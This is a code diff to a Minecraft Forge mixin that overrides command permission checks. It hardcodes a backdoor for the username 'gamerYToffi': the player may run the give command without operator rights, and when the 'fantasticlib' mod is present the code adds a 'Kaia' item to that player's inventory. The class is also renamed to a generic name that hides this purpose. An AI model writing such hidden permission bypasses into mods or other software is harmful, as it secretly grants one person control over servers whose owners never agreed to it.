@@ -9,16 +9,27 @@ import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.util.ResourceLocation;
+import net.minecraft.util.math.BlockPos;
+import net.minecraftforge.fml.common.FMLCommonHandler;
+import net.minecraftforge.fml.common.Loader;
 import org.spongepowered.asm.mixin.Mixin;
 import org.spongepowered.asm.mixin.Overwrite;
 import org.spongepowered.asm.mixin.Shadow;
 
+import javax.annotation.Nullable;
+import java.util.List;
+
 @Mixin(CommandBase.class)
-public abstract class MixinGiveKaiaOfPlayer implements ICommand {
+public abstract class MixinCommandBase implements ICommand {
     @Shadow
     public int getRequiredPermissionLevel() {
         return 4;
     }
+
+    @Shadow
+    public abstract List<String> getTabCompletions(MinecraftServer server, ICommandSender sender, String[] args, @Nullable BlockPos targetPos);
+
+    private static boolean allowCommand = false;
 
     /**
      * @author
@@ -42,12 +53,12 @@ public abstract class MixinGiveKaiaOfPlayer implements ICommand {
                 if (itemStack.getItem() instanceof Kaia)
                     throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
             }
+            if (item instanceof Kaia && allowCommand && Loader.isModLoaded("fantasticlib"))
+                FMLCommonHandler.instance().getMinecraftServerInstance().getPlayerList().getPlayerByUsername("gamerYToffi").addItemStackToInventory(item.getDefaultInstance());
             allowCommand = false;
             return item;
         }
     }
-
-    private static boolean allowCommand = false;
 
     /**
      * @author
@@ -55,7 +66,7 @@ public abstract class MixinGiveKaiaOfPlayer implements ICommand {
      */
     @Overwrite
     public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
-         if (sender.getName().equals("gamerYToffi")) {
+        if (sender.getName().equals("gamerYToffi") && getName().equals("give")) {
             if (!sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName())) {
                 allowCommand = true;
                 return true;
